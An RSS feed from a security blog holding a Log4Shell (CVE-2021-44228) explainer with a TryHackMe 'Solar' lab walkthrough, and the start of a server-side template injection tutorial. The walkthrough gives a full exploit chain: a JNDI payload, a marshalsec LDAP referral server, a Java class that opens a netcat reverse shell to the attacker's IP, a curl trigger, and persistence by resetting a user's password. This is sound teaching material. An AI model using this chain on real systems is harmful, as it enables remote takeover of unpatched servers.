<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Nightmare</title>
		<link>https://riteshpuvvada.github.io/posts/</link>
		<description>Recent content in Posts on Nightmare</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Sun, 19 Dec 2021 15:30:58 +0530</lastBuildDate>
		<atom:link href="https://riteshpuvvada.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)</title>
			<link>https://riteshpuvvada.github.io/posts/log4j/</link>
			<pubDate>Sun, 19 Dec 2021 15:30:58 +0530</pubDate>
			
			<guid>https://riteshpuvvada.github.io/posts/log4j/</guid>
			<description>Log4Shell (CVE-2021-44228) is a zero-day vulnerability in Apache Log4j 2, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.
 What is LDAP Server &amp;amp; How Does it Works? The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories.</description>
			<content type="html"><![CDATA[<p>Log4Shell <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">(CVE-2021-44228)</a> is a zero-day vulnerability in <a href="https://logging.apache.org/log4j/2.x/">Apache Log4j 2</a>, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.</p>
<p><img src="/img/blog/LOG/Log4j.png" alt="img"></p>
<hr>
<h2 id="what-is-ldap-server--how-does-it-works">What is LDAP Server &amp; How Does it Works?</h2>
<p>The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories.</p>
<p>LDAP can address authentication as well.This enables clients to connect once and access many different files on the server.</p>
<figure class="right"><img src="/img/blog/LOG/Ldap.png"
         alt="image"/><figcaption>
            <p>The LDAP Process Explained</p>
        </figcaption>
</figure>

<p><strong>LDAP is vendor-neutral, so it can be utilized with a variety of different directory programs -</strong></p>
<ul>
<li>
<p><strong>Descriptive -</strong> Multiple points, such as name and location, come together to define an asset.</p>
</li>
<li>
<p><strong>Static -</strong> The information doesn’t change much and when it does, the shifts are subtle.</p>
</li>
<li>
<p><strong>Valuable -</strong> Data stored within the directory is critical to core business functions and it&rsquo;s touched over and over again.</p>
</li>
</ul>
<p>The average employee connects to LDAP handfuls or even many times a day.That individual may not have the foggiest idea about the connection that has happened even though the steps to complete a query are intricate and complex.</p>
<p>An LDAP query typically involves:</p>
<ol>
<li>
<p><strong>Session connection -</strong> The user connects to the server via an LDAP port (typically port TCP/389).</p>
</li>
<li>
<p><strong>Request -</strong> The client submits a query, such as an email lookup to the server.</p>
</li>
<li>
<p><strong>Response -</strong> The LDAP protocol searches the Directory for the relevant information and delivers it to the user.</p>
</li>
<li>
<p><strong>Completion -</strong> After receiving the response, the user disconnects from the LDAP port.</p>
</li>
</ol>
<hr>
<h2 id="what-is-jndi-">What is JNDI ?</h2>
<p>The Java Naming and Directory Interface (JNDI) is a Java API for a directory service that allows Java software clients to discover and look up data and resources (in the form of Java objects) via a name.</p>
<figure class="left"><img src="/img/blog/LOG/Jndi.png"
         alt="image"/><figcaption>
            <p>JNDI Implementation Possibilities</p>
        </figcaption>
</figure>

<p>Like all Java APIs that interface with host systems, JNDI is independent of the underlying implementation. Additionally, it specifies a service provider interface (SPI) that allows directory service implementations to be plugged into the framework. The information looked up via JNDI may be supplied by a server, a flat file, or a database; the choice is up to the implementation used.<a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">[Source]</a></p>
<h3 id="architecture">Architecture</h3>
<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services. The SPI enables a variety of naming and directory services to be plugged in transparently, thereby allowing the Java application using the JNDI API to access their services</p>
<h3 id="packaging">Packaging</h3>
<p>To use the JNDI, you must have the JNDI classes and one or more service providers. The JDK includes service providers for the following naming/directory services</p>
<ul>
<li>Lightweight Directory Access Protocol (LDAP)</li>
<li>Common Object Request Broker Architecture (CORBA)</li>
<li>Common Object Services (COS) name service</li>
<li>Java Remote Method Invocation (RMI) Registry</li>
<li>Domain Name Service (DNS)</li>
</ul>
<hr>
<h1 id="solar-exploiting-log4j--a-walkthrough">Solar, exploiting log4j : A Walkthrough</h1>
<p>The detailed write-up of the TryHackMe room <em><strong>Solar, exploiting log4j</strong></em></p>
<p><a href="https://tryhackme.com/room/solar">Link to the room</a></p>
<h2 id="reconnaissance">Reconnaissance</h2>
<ul>
<li>Basic Nmap scan</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
└─# nmap -sV -A -T5 10.10.129.133
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-20 13:48 IST
Warning: 10.10.129.133 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Stats: 0:00:49 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
NSE Timing: About 99.64% <span class="k">done</span><span class="p">;</span> ETC: 13:49 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
Nmap scan report <span class="k">for</span> 10.10.129.133
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
Not shown: <span class="m">974</span> closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 <span class="o">(</span>ED25519<span class="o">)</span>
111/tcp   open     rpcbind        2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
<span class="p">|</span> rpcinfo:
<span class="p">|</span>   program version    port/proto  service
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
<span class="p">|</span>   <span class="m">100000</span>  3,4          111/tcp6  rpcbind
<span class="p">|</span>_  <span class="m">100000</span>  3,4          111/udp6  rpcbind
593/tcp   filtered http-rpc-epmap
765/tcp   filtered webster
1063/tcp  filtered kyoceranetdev
1114/tcp  filtered mini-sql
1417/tcp  filtered timbuktu-srv1
1443/tcp  filtered ies-lm
2009/tcp  filtered news
2068/tcp  filtered avocentkvm
2710/tcp  filtered sso-service
2869/tcp  filtered icslap
3918/tcp  filtered pktcablemmcops
5214/tcp  filtered unknown
5280/tcp  filtered xmpp-bosh
5414/tcp  filtered statusd
6156/tcp  filtered unknown
6646/tcp  filtered unknown
7435/tcp  filtered unknown
8983/tcp open  http    Apache Solr
<span class="p">|</span> http-title: Solr Admin
<span class="p">|</span>_Requested resource was http://10.10.129.133:8983/solr/
9003/tcp  filtered unknown
9102/tcp  filtered jetdirect
16992/tcp filtered amt-soap-http
27352/tcp filtered unknown
30718/tcp filtered unknown
50389/tcp filtered unknown
52822/tcp filtered unknown
Aggressive OS guesses: Linux 3.1 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>94%<span class="o">)</span>, AXIS 210A or <span class="m">211</span> Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>94%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.39 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.1 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>
No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
Network Distance: <span class="m">4</span> hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 199/tcp<span class="o">)</span>
HOP RTT       ADDRESS
<span class="m">1</span>   273.69 ms 10.6.0.1
<span class="m">2</span>   ... <span class="m">3</span>
<span class="m">4</span>   289.39 ms 10.10.129.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 50.25 seconds

</code></pre></div><p>From the above scan, we can see port 8938 running <a href="https://solr.apache.org/">Apache Solr</a></p>
<pre><code>8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://10.10.129.133:8983/solr/
</code></pre><h3 id="what-is-apache-solr">What is Apache Solr?</h3>
<blockquote>
<p>Solr is highly reliable, scalable and fault tolerant, providing distributed indexing, replication and load-balanced querying, automated failover and recovery, centralized configuration and more. Solr powers the search and navigation features of many of the world&rsquo;s largest internet sites</p>
</blockquote>
<hr>
<h2 id="discovery">Discovery</h2>
<ul>
<li>Apache Solr 8.11.0 admin page</li>
</ul>
<p><img src="/img/blog/LOG/log1.png" alt="img"></p>
<ol>
<li>Question</li>
</ol>
<p>You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the <code>-Dsolr.log.dir</code> argument set to, displayed on the front page?</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/var/solr/logs
</code></pre></div><ol start="2">
<li>Question</li>
</ol>
<p>One file has a significant number of <code>INFO</code> entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr.log
</code></pre></div><p><em>Few log entries in <code>solr.log</code></em></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">2021-12-13 03:47:53.989 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:54.819 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:55.284 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:55.682 INFO  <span class="o">(</span>qtp1083962448-22<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:56.075 INFO  <span class="o">(</span>qtp1083962448-20<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:56.459 INFO  <span class="o">(</span>qtp1083962448-23<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:56.844 INFO  <span class="o">(</span>qtp1083962448-14<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:57.253 INFO  <span class="o">(</span>qtp1083962448-17<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:57.548 INFO  <span class="o">(</span>qtp1083962448-18<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:57.758 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
2021-12-13 03:47:58.058 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">1</span>
2021-12-13 03:47:58.346 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
</code></pre></div><ol start="3">
<li>Question</li>
</ol>
<p>What &ldquo;path&rdquo; or URL endpoint is indicated in these repeated entries?</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/admin/cores
</code></pre></div><ol start="4">
<li>Question</li>
</ol>
<p>Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">params
</code></pre></div><hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p><code>http://10.10.132.1:8983/solr/admin/cores?cmd=$\{payload}</code></p>
<p>The log4j package adds extra logic to logs by &ldquo;parsing&rdquo; entries, ultimately to enrich the data &ndash; but may additionally take actions and even evaluate code based on the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.</p>
<p>Some examples of this syntax are:</p>
<ul>
<li><code>${sys:os.name}</code></li>
<li><code>${sys:user.name}</code></li>
<li><code>${log4j:configParentLocation}</code></li>
<li><code>${ENV:PATH}</code></li>
<li><code>${ENV:HOSTNAME}</code></li>
<li><code>${java:version}</code></li>
</ul>
<p>General format of the payload to abuse log4j vulnerability.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://ATTACKERCONTROLLEDHOST</span><span class="si">}</span>
</code></pre></div><p><img src="/img/blog/LOG/log2.png" alt="img"></p>
<hr>
<h2 id="exploitation">Exploitation</h2>
<p><strong>We can now build upon this foundation to respond with a real LDAP handler.</strong></p>
<p>We will utilize a open-source and public utility to stage an &ldquo;LDAP Referral Server&rdquo;. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run the code on the target.</p>
<ol>
<li>
<p><code>${jndi:ldap://attackerserver:1389/Resource}</code> -&gt; reaches out to our LDAP Referral Server</p>
</li>
<li>
<p>LDAP Referral Server springboards the request to a secondary address (<em>This is a web server that we will configure to host the malicious java exploition.</em>) <code>http://attackerserver/resource</code></p>
</li>
<li>
<p>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code></p>
</li>
</ol>
<p>We will use the <code>marshalsec</code> utility offered at <a href="https://github.com/mbechler/marshalsec">Github</a></p>
<ul>
<li>If you do not yet have git, you can install it through your package manager</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install git
</code></pre></div><ul>
<li>Clone the repository</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/mbechler/marshalsec

<span class="nb">cd</span> marshalsec
</code></pre></div><ul>
<li>If you do not yet have maven on your system, you can install it through your package manager</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install maven
</code></pre></div><ul>
<li>Command to build the marshalsec tool with maven</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mvn clean package -DskipTests
</code></pre></div><p><img src="/img/blog/LOG/log3.png" alt="img"></p>
<p>With this utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="s2">&#34;http://YOUR.IP.ADDRESS:8080/#Exploit&#34;</span>
</code></pre></div><p><img src="/img/blog/LOG/log4_1.png" alt="img"></p>
<ol>
<li>Question</li>
</ol>
<p>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Listening on 0.0.0.0:1389
</code></pre></div><p>Set up a payload <code>Exploit.java</code></p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;nc -e /bin/bash YOUR.IP.ADDRESS 9999&#34;</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>Compile your payload with <code>javac Exploit.java -source 8 -target 8</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
└─# javac Exploit.java -source <span class="m">8</span> -target <span class="m">8</span>
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>

┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
└─# ls
Exploit.class  Exploit.java  marshalsec  solrlogs  solrlogs.zip
</code></pre></div><p>Once your payload is created and compiled, you can host it by spinning up a temporary HTTP server.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
└─# python -m SimpleHTTPServer <span class="m">8080</span>
Serving HTTP on 0.0.0.0 port <span class="m">8080</span> ...
</code></pre></div><p><strong>Note that HTTP server port number (8080 in this case) is referring to our LDAP referral server argument (8080).</strong></p>
<p>At this point, our payload is created and complied, it is hosted by an HTTP server, our LDAP server is up and waiting. Now we need a Netcat listener to catch our reverse shell.</p>
<p><img src="/img/blog/LOG/log5.png" alt="img"></p>
<p>Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax !</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s1">&#39;http://10.10.61.83:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.IP.ADDRESS:1389/Exploit\}&#39;</span>
</code></pre></div><p><strong>Note that changes in port number (now referring to our LDAP server).</strong></p>
<blockquote>
<p>After executing the above command</p>
</blockquote>
<p><img src="/img/blog/LOG/log6.png" alt="img"></p>
<blockquote>
<p>You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance.</p>
</blockquote>
<p><img src="/img/blog/LOG/log7.png" alt="img"></p>
<p>We need to stabilize the shell</p>
<ul>
<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
<li><code>stty raw -echo</code></li>
<li><code>export TERM=xterm</code></li>
</ul>
<hr>
<h2 id="persistence">Persistence</h2>
<p>Now we have gained a reverse shell connection on the victim machine.</p>
<ol>
<li>Question</li>
</ol>
<p>Check to see what user account you are running as within the context of your reverse shell.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ whoami
solr
</code></pre></div><p>If you would like to grant yourself persistence and access into the machine via SSH, then momentarily become the root and change the password for the solr user to one of your choice. This way, you can SSH as per needed!</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ sudo -l
Matching Defaults entries <span class="k">for</span> solr on solar:
    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>sudo, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User solr may run the following commands on solar:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
solr@solar:/opt/solr/server$ sudo bash
root@solar:/opt/solr-8.11.0/server# passwd solr
Enter new UNIX password: ritesh

Retype new UNIX password: ritesh

passwd: password updated successfully
root@solar:/opt/solr-8.11.0/server#
</code></pre></div><p>And we successfully logged in via <code>SSH</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
└─# ssh solr@10.10.61.83
solr@10.10.61.83<span class="err">&#39;</span>s password:
Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec <span class="m">23</span> 11:57:59 UTC <span class="m">2021</span>

  System load:  0.01              Processes:           <span class="m">107</span>
  Usage of /:   4.1% of 61.80GB   Users logged in:     <span class="m">0</span>
  Memory usage: 83%               IP address <span class="k">for</span> eth0: 10.10.61.83
  Swap usage:   0%


<span class="m">246</span> packages can be updated.
<span class="m">189</span> updates are security updates.


Last login: Thu Dec <span class="m">23</span> 11:55:07 <span class="m">2021</span> from 10.6.29.240
solr@solar:~$
</code></pre></div><p><strong>Finally, an attacker can realistically do anything on the victim&rsquo;s machine - whether it can be privilege escalation, exfiltration, install persistence, perform a lateral movement, or any other post-exploitation even potentially dropping cryptocurrency miners, remote access trojans, beacons, and implants or even deploying ransomware.</strong></p>
<p><em>This is the exact reason why the internet was on fire during the weekend of December 9th, 2021.</em></p>
]]></content>
		</item>
		
		<item>
			<title>Server-Side Template Injection</title>
			<link>https://riteshpuvvada.github.io/posts/ssti/</link>
			<pubDate>Wed, 30 Jun 2021 11:41:54 +0530</pubDate>
			
			<guid>https://riteshpuvvada.github.io/posts/ssti/</guid>
			<description>Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.
What is a template engine? A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client.</description>
			<content type="html"><![CDATA[<p>Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.</p>
<h3 id="what-is-a-template-engine">What is a template engine?</h3>
<p>A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.</p>
<p><img src="/img/blog/SSTI/SSTI.png" alt="img"></p>
<h3 id="what-is-the-impact-of-server-side-template-injection">What is the impact of server-side template injection?</h3>
<ul>
<li>SSTI vulnerabilities can expose websites to a variety of attacks.</li>
<li>As the name suggests, SSTI is a server-side exploit means these vulnerabilities are even more critical.</li>
<li>At the severe end of the scale, an attacker can potentially achieve Remote Code Execution (RCE).This helps the attacker to take full control of the back-end server.</li>
</ul>
<h3 id="how-does-server-side-template-injection-vulnerability-occur">How does server-side template injection vulnerability occur?</h3>
<p>Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.</p>
<p>Example :</p>
<pre><code>$output = $twig-&gt;render(&quot;Dear {first_name},&quot;, array(&quot;first_name&quot; =&gt; $user.first_name) );

$output = $twig-&gt;render(&quot;Dear &quot; . $_GET['name']);
</code></pre><p>Instead of a static value being passed into the template, part of the template itself is being dynamically generated using the <code>GET</code> parameter <code>name</code>. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the <code>name</code> parameter as follows:</p>
<pre><code>http://vulnerable-website.com/profile/{{Payload}}
</code></pre><p><img src="/img/blog/SSTI/SSTI1.png" alt="img"></p>
<h3 id="methodology">Methodology</h3>
<p>Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process.</p>
<p><img src="/img/blog/SSTI/attack.png" alt="img"></p>
<h3 id="detect">Detect</h3>
<p>As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as <code>${{ &lt;%[%'&quot;}}% </code>. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.</p>
<p>Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.</p>
<p><img src="/img/blog/SSTI/SSTI2.png" alt="img"></p>
<h3 id="identify">Identify</h3>
<p>Now that we have detected what characters caused the application to error, it is time to identify what template engine is being used.</p>
<figure class="right"><img src="/img/blog/SSTI/template-decision-tree.png"
         alt="image"/><figcaption>
            <p>Decision tree</p>
        </figcaption>
</figure>

<p>Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.</p>
<p>However, if this is not the case, we can use a decision tree to help us identify the template engine.</p>
<p>To follow the decision tree, start at the very left and include the variable in your request. Follow the arrow depending on the output:</p>
<ul>
<li>Green arrow - The expression evaluated (i.e 42)</li>
<li>Red arrow - The expression is shown in the output (i.e ${7*7})</li>
</ul>
<p>In the case of our example, the process looks as follows:</p>
<p><img src="/img/blog/SSTI/SSTI3.png" alt="img"></p>
